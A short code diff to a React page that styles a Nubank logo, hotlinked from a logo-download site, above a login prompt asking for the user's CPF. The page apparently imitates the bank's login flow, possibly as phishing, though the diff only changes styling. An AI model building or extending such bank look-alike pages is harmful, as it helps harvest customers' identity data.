@@ -152,10 +152,15 @@ export default function Page() {
       {stage === 'login' && (
         <div className="fixed inset-0 z-[10000] flex flex-col px-6 pb-8 pt-16">
           <img
-            src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-3.png"
-            className="mb-10 h-[36px] w-auto"
-            style={{ filter: 'brightness(10)' }}
-          />
+  src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-3.png"
+  alt="Nubank"
+  style={{
+    width: 45,
+    marginBottom: 40,
+    filter: 'brightness(10)',
+  }}
+/>
+
 
           <h1 className="mb-9 text-[26px] font-medium">
             Olá, qual é o seu CPF?
